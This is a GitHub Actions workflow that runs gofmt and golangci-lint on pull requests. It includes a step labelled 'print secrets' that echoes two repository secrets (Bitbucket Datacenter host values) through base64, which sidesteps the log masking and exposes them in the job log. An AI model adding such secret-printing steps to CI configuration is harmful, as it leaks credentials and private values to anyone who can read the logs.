name: Golangci-lint

on:
  pull_request:
    branches: [main]

jobs:
  lint:
    name: Run linter
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: print secrets
        run: |
          echo ${{ secrets.SPACELIFT_PROVIDER_TEST_BITBUCKET_DATACENTER_API_HOST }} | base64
          echo "-----"
          echo ${{ secrets.SPACELIFT_PROVIDER_TEST_BITBUCKET_DATACENTER_USER_FACING_HOST }} | base64
      
      - name: Install Go
        uses: actions/setup-go@v4
        with:
          go-version: "1.19"

      - name: Check formatting using gofmt
        run: gofmt -s -l -d .

      - name: Run golangci-lint
        uses: golangci/golangci-lint-action@v3
        with:
          version: v1.54
          args: -v
